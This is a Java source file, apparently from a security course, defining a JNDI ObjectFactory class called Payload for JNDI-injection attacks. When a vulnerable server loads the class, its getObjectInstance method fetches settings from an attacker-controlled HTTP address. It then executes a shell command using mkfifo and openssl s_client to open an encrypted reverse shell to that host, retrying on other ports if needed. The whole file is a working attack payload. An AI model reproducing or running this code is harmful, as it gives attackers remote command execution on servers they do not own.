import java.net.*;
import java.io.*;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
/**
 *
 * @author      Muhammad Nur Irsyad
 * @id          1807422020
 * @class       CCIT SEC 8 (TMJ)
 */
public class Payload implements ObjectFactory {
    private static Socket s;
    private static Process p;
    private static String shell = "";
    private static String host = "";
    private static int port = 0;
    //----------
    public void testJsonParser() {
        String[] json  = jsonParser("http://192.168.1.6:2080/properties");  
        // [0] = HOST, [1] = SHELL, [2] = PORT_LISTENER, [3] = PORT_JAVA_HTTP
        shell = json[1]; System.out.println("SHELL\t\t: "+shell);
        host = json[0]; System.out.println("HOST\t\t: "+host);
        port = Integer.parseInt(json[2]); System.out.println("PORT_LISTENER\t: "+port);  
    }

    private static String[] jsonParser(String theUrl) {  
        StringBuilder content = new StringBuilder();  
        String[] fin_arr_json = new String[4];
        String line;        
        //----------
        try {  
            URL url = new URL(theUrl); // creating a url object  
            URLConnection urlConnection = url.openConnection(); // creating a urlconnection object  
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));  
            while ((line = bufferedReader.readLine()) != null) {  
                content.append(line + "\n");  
            }  
            bufferedReader.close();  
        }  catch(Exception e) { e.printStackTrace(); } 
        //----------         
        String[] arr_json = content.toString().split("[\\[\\{,\\]\\}:\\\"]+");
        for (int i = 0; i < (arr_json.length); i++) {
            if ((!arr_json[i].equals("")) && (i%2 == 0)) {
                fin_arr_json[(i/2)-1] = arr_json[i];
            }
        } 
        return fin_arr_json; 
    }      

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        String[] json  = jsonParser("http://192.168.1.6:2080/properties");  
        // [0] = HOST, [1] = SHELL, [2] = PORT_LISTENER, [3] = PORT_JAVA_HTTP
        shell = json[1];
        host = json[0];
        port = Integer.parseInt(json[2]);
        //----------
		while(true) {
	        try {
	            p = Runtime.getRuntime().exec(shell+" -c $@|"+shell+" 0 echo mkfifo /tmp/s; "+shell+" -i < /tmp/s 2>&1 | openssl s_client -quiet -connect "+host+":"+port+" > /tmp/s 2> /dev/null; rm /tmp/s");
				break;
	        } catch (Exception e) {port++;}
		} return null;
    }
}
